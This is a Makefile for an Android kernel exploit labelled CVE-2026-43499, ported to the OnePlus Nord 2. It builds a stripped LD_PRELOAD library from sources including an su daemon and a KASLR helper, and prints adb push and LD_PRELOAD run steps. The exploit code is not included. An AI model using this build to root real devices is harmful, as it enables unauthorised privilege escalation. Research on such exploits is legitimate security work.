# Makefile for OnePlus Nord 2 CVE-2026-43499 exploit
# Ported from aristotle (MediaTek 5.10) to Nord 2 (MediaTek 4.14.186)

# Toolchain - use Termux clang or Android NDK
CC ?= clang
STRIP ?= llvm-strip

# Target configuration
API ?= 30
ARCH = aarch64
TARGET = $(ARCH)-linux-android$(API)

# Compiler flags
CFLAGS = -O2 -Wall -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function
CFLAGS += -fPIE -fstack-protector-strong
CFLAGS += -Isrc -Isrc/kernelsnitch
CFLAGS += -D_GNU_SOURCE
CFLAGS += -DUSE_DIRECT_KASLR  # Use direct KASLR from kallsyms

# Linker flags
LDFLAGS = -shared -static-libgcc
LDFLAGS += -Wl,--version-script=src/version.lds
LDFLAGS += -Wl,--hash-style=gnu

# Source files
SRCS = src/main.c src/slide.c src/util.c src/fops.c src/pipe.c \
       src/preload.c src/su_daemon.c

# Object files
OBJS = $(SRCS:.c=.o)

# Output
OUTPUT = preload.so

.PHONY: all clean

all: $(OUTPUT)

$(OUTPUT): $(OBJS)
	$(CC) $(LDFLAGS) -o $@ $^
	$(STRIP) --strip-unneeded $@
	@echo "Built $(OUTPUT) for OnePlus Nord 2"
	@echo "Install: adb push $(OUTPUT) /data/local/tmp/preload.so"
	@echo "Run: LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id"

%.o: %.c
	$(CC) $(CFLAGS) -c -o $@ $<

clean:
	rm -f $(OBJS) $(OUTPUT)

# For building with Android NDK
ndk:
	@echo "Building with Android NDK..."
	$(MAKE) CC=$(NDK_ROOT)/toolchains/llvm/prebuilt/linux-x86_64/bin/$(TARGET)-clang \
	         STRIP=$(NDK_ROOT)/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-strip

# Test build
test: $(OUTPUT)
	@echo "Testing build..."
	file $(OUTPUT)
	readelf -h $(OUTPUT) | grep -E "Type|Machine"
